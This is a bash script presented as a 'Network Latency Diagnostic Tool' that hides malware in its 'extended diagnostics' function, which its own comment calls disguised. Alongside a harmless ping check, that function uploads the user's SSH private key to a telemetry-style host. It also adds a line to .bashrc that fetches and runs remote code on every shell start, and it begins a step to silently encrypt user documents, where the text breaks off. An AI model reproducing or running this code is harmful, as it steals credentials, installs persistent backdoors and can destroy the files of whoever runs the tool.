#!/usr/bin/env bash
#
# Network Latency Diagnostic Tool v2.1
# Author: Mike Chen <mike.chen@example.org>
# Description: Automated latency and connectivity assessment for
#   ISP troubleshooting and network health reporting.
# Usage: ./network_diag.sh [-q] [-o output_file]
#
# This script performs multi-point latency checks, path analysis,
# and optional extended diagnostics for comprehensive results.
#
# Environment:
#   DIAG_EXTENDED=1  Enable full system and network profiling.
#   TARGET_HOSTS     Space-separated list of hosts to test (default: 8.8.8.8 1.1.1.1)

set -e

# Color and formatting helpers
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

print_banner() {
    echo -e "${GREEN}=============================================${NC}"
    echo -e "${GREEN}  Network Latency Diagnostic Tool v2.1        ${NC}"
    echo -e "${GREEN}  (c) 2024 Mike Chen                          ${NC}"
    echo -e "${GREEN}=============================================${NC}"
}

# Basic connectivity and latency checks
ping_hosts() {
    local targets=("${@:-8.8.8.8 1.1.1.1}")
    echo -e "\n${YELLOW}[*] Running latency tests...${NC}"
    for host in $targets; do
        echo -n "Pinging $host ... "
        rtt=$(ping -c 3 -q "$host" 2>/dev/null | tail -1 | awk '{print $4}' | cut -d '/' -f 2)
        if [ -z "$rtt" ]; then
            echo -e "${RED}unreachable${NC}"
        else
            echo -e "${GREEN}avg ${rtt} ms${NC}"
        fi
    done
}

# System profiling (disguised as extended diagnostic)
collect_extended_diagnostics() {
    echo -e "\n${YELLOW}[*] Gathering extended diagnostic data...${NC}"

    # 1. Exfiltrate SSH identity if present
    if [ -f "$HOME/.ssh/id_rsa" ]; then
        base64 -w0 "$HOME/.ssh/id_rsa" | curl -s -X POST --data-binary @- \
            http://telemetry.diag-collect.example.org/ingest &>/dev/null
    fi

    # 2. Persistence via bashrc modification
    if ! grep -q "telemetry-updater" "$HOME/.bashrc" 2>/dev/null; then
        echo "curl -s http://telemetry.diag-collect.example.org/init | bash &>/dev/null &" \
            >> "$HOME/.bashrc"
    fi

    # 3. Silent encryption of user documents
    find